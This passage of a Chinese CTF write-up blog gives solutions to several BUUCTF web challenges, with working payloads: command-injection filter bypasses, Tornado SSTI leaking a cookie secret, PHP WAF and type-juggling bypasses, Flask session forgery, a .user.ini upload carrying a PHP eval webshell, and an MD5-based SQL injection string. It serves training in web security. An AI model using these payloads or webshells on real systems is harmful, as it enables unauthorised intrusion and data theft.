if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>故不能直接输入flag</p>
<p>payload1：设置变量法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.ph</span><br></pre></td></tr></table></figure>
<p>payload2：base64编码法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
<h2 id="PHP下空格检测绕过"><a href="#PHP下空格检测绕过" class="headerlink" title="PHP下空格检测绕过"></a>PHP下空格检测绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>
<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>来源：ACTF2020新生赛</p>
<p>考察：RCE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post data:target&#x3D;127.0.0.1;cd ..&#x2F;..&#x2F;..;cat flag</span><br></pre></td></tr></table></figure>
<h1 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h1><p>来源：极客大挑战2019</p>
<p>考察：菜刀使用</p>
<p>使用菜刀连接，密码为Syc</p>
<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>来源：护网杯2018</p>
<p>考察：SSTI</p>
<p>hint.txt提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
<p>flag.txt提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag in &#x2F;fllllllllllllag</span><br></pre></td></tr></table></figure>
<p>welcome.txt提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render</span><br></pre></td></tr></table></figure>
<p>注意到，URL形式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;8ac8b45a29c64746207667391eeb39f1</span><br></pre></td></tr></table></figure>
<p>故现在求出cookie_secret后，进行md5运算即可得到filehash</p>
<p>尝试一个错误的filehash，返回error?msg</p>
<p>尝试SSTI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg&#x3D;&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>回显1，说明存在SSTI</p>
<p>尝试运算的SSTI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg&#123;&#123;1+2&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>回显Orz，说明不存在运算</p>
<p>获取tornado框架附属配置文件handler.settings，得到cookie_secret</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>之后运算得到filehash</p>
<h1 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy_Calc"></a>Easy_Calc</h1><p>来源：RoarCTF2019</p>
<p>考察：waf绕过</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/remon535/p/12727042.html">https://www.cnblogs.com/remon535/p/12727042.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;calc.php?num&#x3D;1%2B2 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>查看calc.php，发现过滤的黑名单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>加空格，绕过检测</p>
<p>原理：加空格使waf把num参数错误解析成%20num，这个参数是不存在的，但php解析的时候会自动把空格删掉，从而bypass。</p>
<p>scandir查看目录，/被过滤，使用ascii码</p>
<p>var_dump用于判断变量的类型和长度，若有变量值可以输出，则输出其值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump ( mixed expression [, mixed expression [, ...]] )</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(24) &#123; [0]&#x3D;&gt; string(1) &quot;.&quot; [1]&#x3D;&gt; string(2) &quot;..&quot; [2]&#x3D;&gt; string(10) &quot;.dockerenv&quot; [3]&#x3D;&gt; string(3) &quot;bin&quot; [4]&#x3D;&gt; string(4) &quot;boot&quot; [5]&#x3D;&gt; string(3) &quot;dev&quot; [6]&#x3D;&gt; string(3) &quot;etc&quot; [7]&#x3D;&gt; string(5) &quot;f1agg&quot; [8]&#x3D;&gt; string(4) &quot;home&quot; [9]&#x3D;&gt; string(3) &quot;lib&quot; [10]&#x3D;&gt; string(5) &quot;lib64&quot; [11]&#x3D;&gt; string(5) &quot;media&quot; [12]&#x3D;&gt; string(3) &quot;mnt&quot; [13]&#x3D;&gt; string(3) &quot;opt&quot; [14]&#x3D;&gt; string(4) &quot;proc&quot; [15]&#x3D;&gt; string(4) &quot;root&quot; [16]&#x3D;&gt; string(3) &quot;run&quot; [17]&#x3D;&gt; string(4) &quot;sbin&quot; [18]&#x3D;&gt; string(3) &quot;srv&quot; [19]&#x3D;&gt; string(8) &quot;start.sh&quot; [20]&#x3D;&gt; string(3) &quot;sys&quot; [21]&#x3D;&gt; string(3) &quot;tmp&quot; [22]&#x3D;&gt; string(3) &quot;usr&quot; [23]&#x3D;&gt; string(3) &quot;var&quot; &#125; </span><br></pre></td></tr></table></figure>
<p>查看f1aag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
<h2 id="利用PHP字符串解析特性绕过waf"><a href="#利用PHP字符串解析特性绕过waf" class="headerlink" title="利用PHP字符串解析特性绕过waf"></a>利用PHP字符串解析特性绕过waf</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
<p>原理：加空格使waf把var参数错误解析成%20var，这个参数是不存在的，但php解析的时候会自动把空格删掉，从而bypass。同时PHP还会把某些字符转换成下划线。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入                                      解析的PHP                           用户名</span><br><span class="line">%20foo_bar%00            	            foo_bar            	                foo_bar            </span><br><span class="line">foo%20bar%00            	                foo bar            	                foo_bar            </span><br><span class="line">foo%5bbar            	                foo[bar            	                foo_bar    </span><br></pre></td></tr></table></figure>
<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><p>来源：极客大挑战2019</p>
<p>考察：burp</p>
<p>dirmap扫描到Secret.php，访问后提示需要来自<a target="_blank" rel="noopener" href="https://www.sycsecret.com,修改header,添加referer字段/">https://www.Sycsecret.com，修改header，添加referer字段</a></p>
<p>之后根据提示不断改包即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Secret.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:26729</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: UM_distinctid&#x3D;177e687e99a33-0c1e5b912ef271-47534130-13c680-177e687e99d41</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h1><p>来源：ACTF2020新生赛</p>
<p>考察：信息搜集</p>
<p>访问index.php.bak</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?key&#x3D;123</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>来源：HCTF2018</p>
<p>考察：flask的session伪造</p>
<p>注册并登陆后，发现显示了用户名。判断为二次注入。但尝试之后，发现二次注入会导致web server错误，并且无正确回显，放弃。</p>
<p>登录后，在主页面看到注释 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- you are not admin --&gt;</span><br></pre></td></tr></table></figure>
<p>说明要以admin登录</p>
<p>在change password页面下，有注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt;</span><br></pre></td></tr></table></figure>
<p>访问并下载，得到源码，发现其根据session判断用户是否为admin</p>
<p>flask的session是一个字符串，由句号分割成三个部分，第一个部分是base64加密的数据，第二个部分是时间戳，第三个部分是校验信息</p>
<p>解密session代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    print( payload)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;f1c3cbc2d6b1c0e5b8f1d5a0c19cf89d12e63f6dd22c1f41f6830d8a10e41cac5e653c4e7f774ec1e068fb7bf2d24995d146b7c18a14b0525f8aa48c7baf51e3&#39;, &#39;csrf_token&#39;: b&#39;eb20dbd07b0c3c9c7573a2d4fddd56c767e75d34&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure>
<p>使用flask_session_cookie_manager</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;f1c3cbc2d6b1c0e5b8f1d5a0c19cf89d12e63f6dd22c1f41f6830d8a10e41cac5e653c4e7f774ec1e068fb7bf2d24995d146b7c18a14b0525f8aa48c7baf51e3&#39;, &#39;csrf_token&#39;: b&#39;eb20dbd07b0c3c9c7573a2d4fddd56c767e75d34&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;</span><br></pre></td></tr></table></figure>
<h1 id="Buy-You-Flag"><a href="#Buy-You-Flag" class="headerlink" title="Buy You Flag"></a>Buy You Flag</h1><p>来源：极客大挑战2019</p>
<p>考察：burp改包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>更改cookie值</p>
<p>直接提交money为100000000，提示长度太长</p>
<p>wp说使用的strcmp，故使money[]=1即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;pay.php HTTP&#x2F;1.1</span><br><span class="line">Host: 6c6427ff-fe35-4f04-98e0-d1b7c23a75c9.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: UM_distinctid&#x3D;177e687e99a33-0c1e5b912ef271-47534130-13c680-177e687e99d41; user&#x3D;1</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">password&#x3D;404s&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure>
<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>来源：SUCTF2019</p>
<p>考察：文件上传</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2907426b4a91">https://www.jianshu.com/p/2907426b4a91</a></p>
<p>.user.ini中设置auto_prepend_file，可以将文件自动添加到index.php中</p>
<p>.user.ini</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;1.jpg</span><br><span class="line">auto_prepend_file&#x3D;2.jpg</span><br></pre></td></tr></table></figure>
<p>上传包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;2.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>蚁剑连接返回目录下的index.php，得到flag</p>
<h2 id="user-ini上传"><a href="#user-ini上传" class="headerlink" title=".user.ini上传"></a>.user.ini上传</h2><p><strong>使用条件：</strong><br> (1)服务器脚本语言为PHP<br> (2)对应目录下面有可执行的php文件<br> (3)服务器使用CGI／FastCGI模式</p>
<p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的<code>php.ini</code>，我们可以自定义除了<code>PHP_INI_SYSTEM</code>以外的模式，在执行php代码之前，系统会对<code>.user.ini</code>先做一个执行，然后才执行其他的php文件。</p>
<p>我们这边利用<code>.user,ini</code>先执行<code>auto_prepend_file</code>函数，<code>auto_prepend_file</code>表示在php程序加载第一个php代码前加载的php文件，也就是先加载了a.jpg里面的文件，即一句话木马。</p>
<h1 id="EasyMD5"><a href="#EasyMD5" class="headerlink" title="EasyMD5"></a>EasyMD5</h1><p>来源：BJDCTF2020</p>
<p>考察：MD5碰撞</p>
<p>参考：</p>
<p>随便提交一个信息，抓包后发现header处有提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure>
<p>此时需要构造pass，使得password可以实现注入</p>
<p>根据博文<a target="_blank" rel="noopener" href="https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/%EF%BC%8C%E4%BD%BF%E7%94%A8ffifdyop%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5">https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/，使用ffifdyop进行注入</a></p>
<p>ffufdyop字符串被md5哈希之后，变成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">276f722736c95d99e921722cf9ed621c</span><br></pre></td></tr></table></figure>
<p>前几位刚好为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘  ‘or  ‘6...‘</span><br></pre></td></tr></table></figure>


<p>跳转到下一个页面，提示提交a和b，满足</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)</span><br></pre></td></tr></table></figure>
<p>md5函数原型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(string $str [, bool $raw_output &#x3D; false]) : string</span><br></pre></td></tr></table></figure>
<p>故传入一个数组，不会被解析，无论值为何物都得到相同的md5值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95dea853-f3c0-45b8-aeae-1c1f3031d72a.node3.buuoj.cn&#x2F;levels91.php?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95dea853-f3c0-45b8-aeae-1c1f3031d72a.node3.buuoj.cn&#x2F;levell14.php</span><br></pre></td></tr></table></figure>
<p>提示提交param，并满足下面的条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95dea853-f3c0-45b8-aeae-1c1f3031d72a.node3.buuoj.cn&#x2F;levell14.php</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="php的md5函数"><a href="#php的md5函数" class="headerlink" title="php的md5函数"></a>php的md5函数</h2><p>md5函数原型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(string $str [, bool $raw_output &#x3D; false]) : string</span><br></pre></td></tr></table></figure>
<p>故传入一个数组，不会被解析，无论值为何物都得到相同的md5值</p>
<h2 id="md5函数的sql注入"><a href="#md5函数的sql注入" class="headerlink" title="md5函数的sql注入"></a>md5函数的sql注入</h2><p>使用ffifdyop进行注入</p>
<p>ffufdyop字符串被md5哈希之后，变成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">276f722736c95d99e921722cf9ed621c</span><br></pre></td></tr></table></figure>
<p>前几位刚好为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘  ‘or  ‘6...‘</span><br></pre></td></tr></table></figure>
<h1 id="nizhuansiwei"><a href="#nizhuansiwei" class="headerlink" title="nizhuansiwei"></a>nizhuansiwei</h1><p>来源：ZJCTF2019</p>
<p>考察：文件包含，php反序列化</p>
<p>访问页面，需要提交text，file，password三个变量</p>
